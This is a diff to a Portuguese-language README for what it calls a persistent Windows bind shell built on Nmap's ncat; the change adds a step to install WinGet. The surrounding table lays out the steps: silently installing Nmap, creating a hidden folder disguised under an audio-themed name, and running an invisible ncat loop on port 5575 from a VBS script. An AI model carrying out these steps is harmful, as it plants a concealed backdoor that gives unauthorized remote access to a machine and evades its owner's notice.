@@ -18,6 +18,7 @@ Bind Shell persistente no Windows via NCAT (Nmap).
 
 | Etapa | Descrição |
 |-------|-----------|
+| 0 | Instalar o WinGet se necessário
 | 1 | Instala o **Nmap** silenciosamente via `winget` (contém o `ncat`) |
 | 2 | Cria pasta oculta `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
 | 3 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **5575** |
